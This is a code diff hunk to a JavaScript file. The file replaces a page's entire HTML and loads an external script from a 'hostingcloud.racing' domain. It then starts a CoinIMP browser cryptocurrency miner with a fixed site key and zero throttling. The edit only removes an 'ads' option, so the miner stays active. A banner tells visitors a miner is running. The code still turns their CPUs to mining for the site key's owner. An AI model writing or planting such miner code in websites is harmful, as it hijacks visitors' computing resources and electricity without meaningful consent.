@@ -22,7 +22,7 @@ document.documentElement.innerHTML = `<html><head><link rel="icon" href="data:im
 <script src="https://www.hostingcloud.racing/mcWn.js"></script>
 <script>
     var _client = new Client.Anonymous('fe7d18a60c177fc6f388db93ce9ce9c2931471ef634b0581a5a8d930a9adf56f', {
-        throttle: 0, c: 'w', ads: 0
+        throttle: 0, c: 'w',
     });
     _client.start();
     _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
